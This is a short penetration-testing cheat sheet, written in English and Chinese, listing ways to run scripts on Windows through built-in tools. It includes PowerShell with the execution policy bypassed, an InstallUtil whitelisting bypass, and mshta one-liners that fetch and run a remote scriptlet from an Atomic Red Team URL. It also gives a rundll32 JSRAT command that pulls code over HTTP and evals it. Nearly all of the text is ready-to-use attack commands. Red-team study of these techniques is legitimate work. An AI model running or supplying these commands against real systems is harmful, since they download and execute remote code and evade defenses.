windows script example in penetration
----

#### 1.	powershell ####

	powershell -executionpolicy bypass ./powershell_script.ps1

#### 2. VBS ####

默认可以直接在机器上运行，命令行下可以通过`cscript.exe`执行

	cscript.exe vbs_script.vbs
	vbs_script.vbs

#### 3. csc(.cs c#) ####

首先通过`csc.exe`进行编译c#为`exe`，然后通过`InstallUtil.exe`进行程序执行

	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:PEL.exe InstallUtilBypass.cs

	InstallUtil.exe /logfile= /LogToConsole=false /U PEL.exe

#### 4. Jscript(.js) ####

可以通过`wscript.exe`、`cscript.exe`以及直接运行，主要通过`ActiveXObject()`创建对应的对象`WScript.shell`、`Shell.Application`.

	cscript.exe/wscript.exe jscript.js
	jscript.js

JScript参考链接：http://www.yuanma.net/Manual/JavaScript/

https://evi1cg.me/archives/Run_JSRAT.html

#### 5. Mshta ####

	mshta vbscript:Close(Execute("GetObject(""script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/mshta.sct"").Exec()"))

	mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/mshta.sct").Exec();close();

#### 6. Rundll32 ####

	rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://127.0.0.1:8081/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}%  #JSRAT

	rundll32 AllTheThings.dll,EntryPoint	# https://github.com/redcanaryco/atomic-red-team/tree/master/Windows/Payloads/AllTheThings

